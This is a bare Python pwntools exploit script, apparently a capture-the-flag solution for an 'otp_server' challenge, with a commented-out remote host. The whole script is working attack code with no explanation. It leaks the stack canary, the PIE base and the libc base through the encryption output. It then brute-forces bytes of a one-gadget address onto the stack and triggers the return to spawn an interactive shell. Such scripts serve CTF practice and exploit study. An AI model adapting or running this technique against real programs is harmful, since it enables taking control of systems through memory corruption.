from pwn import *
def cmd(n):
	p.sendlineafter(">>> ",str(n))
def key(key):
	cmd(1)
	p.sendafter(":\n",str(key))
def enc(e):
	cmd(2)
	p.sendafter(":\n",str(e))
def fill(offset,data):
	key("\xff"*(0x10+offset)+'\x00')
	i=0
	while(1):
		i+=1
		#print i
		enc("A"*0x100)
		p.readuntil("--\n")
		tmp=p.read(4)
		res=""
		for x in tmp:
			res+=chr(ord(x)^0xff)
		res=u32(res)
		res=res>>24
		if ((res&0xff)==data):
			return	

libc=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p=process('./otp_server')
#p=remote("challenges3.fbctf.com",1338)
key("\xff"*0xe0)
enc("A"*0x100)
p.readuntil("--\n")
p.read(0x108)
canary=u64(p.read(8))
pie=u64(p.read(8))-0xdd0
base=u64(p.read(8))-(0x7ffff7a05b97-0x7ffff79e4000)
p.read(8)
stack=u64(p.read(8))
#log.warning(hex(canary))

log.warning(hex(base))
libc.address=base
one=0x10a38c+base
one=0xffffff&one
log.success(hex(one))

fill(3,((one>>16)&0xff))
fill(2,((one>>8)&0xff))
fill(1,(one&0xff))


gdb.attach(p,'''
b *0x555555554dcc
''')

context.log_level='debug'
cmd(3)

p.interactive()
